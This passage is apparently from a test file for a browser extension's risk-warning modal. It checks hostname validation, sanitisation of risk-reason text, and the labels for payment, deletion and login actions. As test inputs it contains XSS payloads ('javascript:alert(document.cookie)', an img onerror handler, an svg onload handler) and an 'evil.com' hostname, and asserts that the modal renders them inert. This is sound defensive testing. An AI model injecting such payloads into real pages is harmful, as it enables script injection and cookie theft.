  assertEquals(getSafeDisplayHost(undefined, 'evil.com/exploit'), null, 'Rejects hostnames containing slashes');

  // Verify clean, valid hostnames pass validation
  assertEquals(getSafeDisplayHost('https://secure.bank.com:8443/checkout', 'secure.bank.com'), 'secure.bank.com', 'Accepts valid secure hostname');
  assertEquals(getSafeDisplayHost('http://localhost:3000', 'localhost'), 'localhost', 'Accepts localhost');

  // When context contains a malicious origin, verify the Website item is omitted
  const maliciousHostContext = createSampleContext({
    origin: 'javascript:alert(document.cookie)',
    hostname: 'javascript:alert(1)',
  });
  updateStagingModal({ context: maliciousHostContext });
  shadow = getStagingModalShadowRoot();
  let foundMaliciousWebsite = false;
  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
    if (label.textContent === 'Website') {
      foundMaliciousWebsite = true;
    }
  });
  assertEquals(foundMaliciousWebsite, false, 'Malicious origin/hostname rejected; Website field omitted');

  // 10C: XSS vectors in risk reasons
  const hostileReasonContext = createSampleContext({
    riskReasons: [
      '<img src=x onerror=alert("hacked")> Destructive deletion signal',
      '<svg/onload=alert("xss")> Financial interaction signal',
    ],
  });
  updateStagingModal({ context: hostileReasonContext });
  shadow = getStagingModalShadowRoot();
  const reasonDetails = shadow?.querySelectorAll('.gs-reason-detail') || [];
  assertEquals(reasonDetails.length, 2, 'Renders two hostile reason details');
  assertEquals(reasonDetails[0]?.children.length, 0, 'No image element created in reason detail');
  assertEquals(reasonDetails[1]?.children.length, 0, 'No svg element created in reason detail');

  // 10D: Direct validation of translateRiskReason
  const paymentTranslation = translateRiskReason('Action interacts with financial transactions, checkout flows, or billing elements.');
  assertEquals(paymentTranslation.headline, 'Payment or Billing Activity', 'Correct headline for payment reason');

  const destructiveTranslation = translateRiskReason('Action initiates permanent resource deletion, cancellation, or irreversible state destruction.');
  assertEquals(destructiveTranslation.headline, 'Permanent Removal or Deletion', 'Correct headline for destructive reason');

  const authTranslation = translateRiskReason('Action interacts with authentication boundaries, credential inputs, or login sessions.');
  assertEquals(authTranslation.headline, 'Sign-in or Account Credentials', 'Correct headline for auth reason');

  const downloadTranslation = translateRiskReason('Action triggers a file download, software installation, or document export.');
  assertEquals(downloadTranslation.headline, 'File Download', 'Correct headline for download reason');

  const extNavTranslation = translateRiskReason('Action navigates away from the current trusted domain to an external destination.');
  assertEquals(extNavTranslation.headline, 'External Website Destination', 'Correct headline for external nav reason');

  const fallbackTranslation = translateRiskReason('');
  assertEquals(fallbackTranslation.headline, 'Standard Safety Check', 'Empty reason translates to Standard Safety Check');

  // 10E: Direct validation of getRiskLevelPresentation
  const critPres = getRiskLevelPresentation(RiskLevel.CRITICAL);
  assertEquals(critPres.className, 'gs-risk-critical', 'Critical presentation has gs-risk-critical class');
  assert(Boolean(critPres.headline.includes('High-Impact Action')), 'Critical presentation headline describes high impact');

  const highPres = getRiskLevelPresentation(RiskLevel.HIGH);
  assertEquals(highPres.className, 'gs-risk-high', 'High presentation has gs-risk-high class');
  assert(Boolean(highPres.headline.includes('Sensitive Operation')), 'High presentation headline describes sensitive operation');

  const medPres = getRiskLevelPresentation(RiskLevel.MEDIUM);
  assertEquals(medPres.className, 'gs-risk-medium', 'Medium presentation has gs-risk-medium class');

  const lowPres = getRiskLevelPresentation(RiskLevel.LOW);
  assertEquals(lowPres.className, 'gs-risk-low', 'Low presentation has gs-risk-low class');

  // 10F: Direct validation of formatActionTypeName & formatCategoryName
  assertEquals(formatActionTypeName(ActionType.CLICK), 'Button / Link Click', 'Formats CLICK action type');
  assertEquals(formatActionTypeName(ActionType.SUBMIT), 'Form Submission', 'Formats SUBMIT action type');
  assertEquals(formatActionTypeName(undefined), 'Standard Interaction', 'Formats undefined action type');

  assertEquals(formatCategoryName(ActionCategory.PAYMENT), 'Payment & Billing', 'Formats PAYMENT category');
  assertEquals(formatCategoryName(ActionCategory.DESTRUCTIVE), 'Permanent Deletion / Removal', 'Formats DESTRUCTIVE category');
  assertEquals(formatCategoryName(ActionCategory.AUTHENTICATION), 'Authentication & Login', 'Formats AUTHENTICATION category');
  assertEquals(formatCategoryName(undefined), 'General Activity', 'Formats undefined category');

  dismissStagingModal();
}

console.log('\n============================================================');
console.log(`TOTAL STAGING UI TESTS: ${passed + failed} | PASSED: ${passed} | FAILED: ${failed}`);
console.log('============================================================\n');

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
